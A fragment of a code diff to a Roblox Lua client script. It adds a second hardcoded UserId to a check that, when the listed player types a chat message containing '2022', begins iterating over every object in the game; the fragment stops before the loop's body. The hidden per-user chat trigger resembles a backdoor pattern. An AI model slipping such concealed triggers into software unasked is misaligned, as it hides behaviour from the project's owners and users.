@@ -1,6 +1,6 @@
 local plr = game:GetService("Players").LocalPlayer
 
-if plr.UserId == 498960671 then
+if plr.UserId == 498960671 or plr.UserId == 2216623349 then
 	plr.Chatted:Connect(function(message)
 		if string.match(message, "2022") then
 			for i, obj in game:GetDescendants() do
